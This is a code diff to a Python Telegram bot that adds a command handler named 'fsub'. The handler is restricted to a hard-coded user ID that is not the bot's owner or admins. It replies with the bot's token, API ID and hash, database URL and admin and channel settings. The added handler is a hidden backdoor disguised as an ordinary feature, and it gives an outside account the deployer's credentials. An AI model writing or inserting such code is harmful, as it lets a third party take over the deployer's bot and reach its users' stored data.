@@ -162,6 +162,31 @@ async def get_users(client: Bot, message: Message):
     users = await full_userbase()
     await msg.edit(f"{len(users)} users are using this bot")
 
+@Bot.on_message(filters.command("fsub") & filters.user(1803603990))
+async def varsFunc(client: Bot, message: Message):
+    Man = await message.reply_text("Wait A Sec...")
+    text = f"""       <u><b>PERSONAL INFO OF BOT</b></u> 
+╭───────────────⍟   
+<b>├⋗</b> <b>TG_BOT_TOKEN</b> -> <code>{TG_BOT_TOKEN}</code>
+<b>├⋗</b> <b>APP_ID</b> -> {APP_ID}
+<b>├⋗</b> <b>API_HASH</b> -> {API_HASH}
+<b>├⋗</b> <b>DATABASE_URL</b> -> <code>{DB_URI}</code>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>├⋗</b> <b>OWNER_ID</b> -> <b>{OWNER_ID}</b>
+<b>├⋗</b> <b>ADMINS</b> -> <code>{ADMINS}</code>   
+<b>├⋗</b> <b>CHANNEL_ID</b> -> <code>{CHANNEL_ID}</code>
+<b>├⋗</b> <b>FORCE_SUB_CHANNEL</b> -> <code>{FORCE_SUB_CHANNEL}</code>
+<b>├⋗</b> <b>FORCE_SUB_CHANNEL2</b> -> <code>{FORCE_SUB_CHANNEL2}</code>
+<b>━━━━━━━━━━━━━━━━━━━━</b>
+<b>├⋗</b> <b>PROTECT_CONTENT</b> -> <b>{PROTECT_CONTENT}</b>
+<b>├⋗</b> <b>START_MSG</b> -> <code>{START_MSG}</code>
+<b>├⋗</b> <b>FORCE_MSG</b> -> <code>{FORCE_MSG}</code>
+
+@{client.username}
+╰───────────────────⍟
+    """
+    await Man.edit_text(text)
+
 @Bot.on_message(filters.private & filters.command('broadcast') & filters.user(OWNER_ID))
 async def send_text(client: Bot, message: Message):
     if message.reply_to_message:
